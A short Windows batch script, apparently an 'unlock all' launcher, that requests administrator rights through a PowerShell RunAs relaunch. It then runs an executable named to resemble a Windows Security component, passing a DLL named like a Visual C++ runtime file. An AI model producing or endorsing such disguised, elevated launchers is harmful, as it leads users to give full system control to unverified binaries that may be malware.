@echo off
cd /d "%~dp0"
color 4
echo Current user privileges: %userprofile%
echo.
echo Requesting administrative privileges...

:: Check if the script is already running with elevated privileges (Administrator).
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :continue
) else (
    goto :admin
)

:admin
echo.
echo You need to run this batch file as an Administrator.
echo Please grant administrative privileges by selecting "Yes" when prompted.
echo.
:: Re-run the batch script with elevated privileges (RunAs).
powershell -Command "Start-Process '%0' -Verb RunAs"
exit

:continue
echo Administrative privileges confirmed.
echo.

:: Run your command (make sure this is the correct command).
securityhealthwindows.exe vcruntime140dd.dll

echo.
echo unlocked all!
echo.
pause > nul
exit
